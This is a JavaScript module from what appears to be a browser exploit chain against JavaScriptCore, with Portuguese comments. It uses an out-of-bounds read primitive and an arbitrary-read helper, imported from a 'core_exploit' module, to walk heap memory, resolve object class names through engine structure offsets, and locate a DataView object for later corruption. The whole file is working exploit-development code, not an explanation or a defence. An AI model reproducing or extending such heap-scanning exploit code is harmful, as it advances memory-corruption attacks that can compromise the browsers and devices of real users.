// js/script3/testArrayBufferVictimCrash.mjs (Revisão 49 - Diagnóstico de Posição do DataView)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_read_absolute,
    isOOBReady,
    oob_dataview_real,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    if (high < 0x1000) return false;
    if ((high & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

async function read_cstring(address) {
    let str = "";
    for (let i = 0; i < 128; i++) {
        const char_code = await arb_read(address, 1, i);
        if (char_code === 0x00) break;
        str += String.fromCharCode(char_code);
    }
    return str;
}

// ... (Estratégias antigas podem ser mantidas aqui) ...

// ======================================================================================
// ESTRATÉGIA DE DIAGNÓSTICO (R49)
// ======================================================================================
export const FNAME_MODULE_DATAVIEW_SCANNER_R49 = "DataViewScanner_R49_Diagnostic";

async function find_and_log_all_objects_R49() {
    if (!isOOBReady()) throw new Error("Ambiente OOB não está pronto para o escaneamento.");
    
    logS3(`[R49] Iniciando escaneamento de diagnóstico do heap...`, 'subtest');
    
    const CLASS_INFO_OFFSET = JSC_OFFSETS.Structure.CLASS_INFO_OFFSET;
    const CLASS_INFO_CLASS_NAME_OFFSET = 0x8;
    let found_objects = {};
    let found_dataview_info = null;

    for (let i = 0; i < OOB_CONFIG.ALLOCATION_SIZE - 0x10; i += 8) {
        try {
            const p_struct = oob_read_absolute(i, 8);
            if (!isValidPointer(p_struct)) continue;
            
            const p_class_info = await arb_read(p_struct, 8, CLASS_INFO_OFFSET);
            if (!isValidPointer(p_class_info)) continue;
            
            const p_class_name = await arb_read(p_class_info, 8, CLASS_INFO_CLASS_NAME_OFFSET);
            if (!isValidPointer(p_class_name)) continue;
            
            const class_name = await read_cstring(p_class_name);
            
            if (class_name && class_name.length > 2) {
                const object_addr = oob_dataview_real.buffer_addr.add(i);
                
                // Nós encontramos um DataView! Esta é a informação que precisamos.
                if (class_name === "DataView") {
                    logS3(`[R49 Scan] VITÓRIA! Encontrado 'DataView' no offset 0x${i.toString(16)}. Endereço: ${object_addr.toString(true)}`, 'vuln_major');
                    found_dataview_info = {
                        offset: i,
                        address: object_addr.toString(true)
                    };
                }

                if (!found_objects[class_name]) found_objects[class_name] = 0;
                found_objects[class_name]++;
            }

        } catch (e) { /* Ignora e continua */ }
    }

    logS3(`[R49] Escaneamento concluído. Resumo dos objetos encontrados:`, 'good');
    logS3(JSON.stringify(found_objects, null, 2), 'info');
    
    return found_dataview_info;
}

export async function executeDataViewScan_R49() {
    const FNAME = FNAME_MODULE_DATAVIEW_SCANNER_R49;
    logS3(`--- Iniciando ${FNAME} ---`, "test");
    let result = { success: false, msg: "Escaneamento não encontrou o DataView.", dataview_offset: -1 };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
        
        const dv_info = await find_and_log_all_objects_R49();

        if (dv_info) {
            result.success = true;
            result.dataview_offset = dv_info.offset;
            result.msg = `SUCESSO! O objeto DataView foi encontrado no offset 0x${dv_info.offset.toString(16)}.`;
        }

    } catch (e) {
        result.msg = `Erro crítico no escaneador de heap: ${e.message}`;
        logS3(`[${FNAME}] ERRO: ${result.msg}`, "critical");
        console.error(e);
    } finally {
        // Não limpa o ambiente para que possamos inspecionar se necessário
    }

    return result;
}
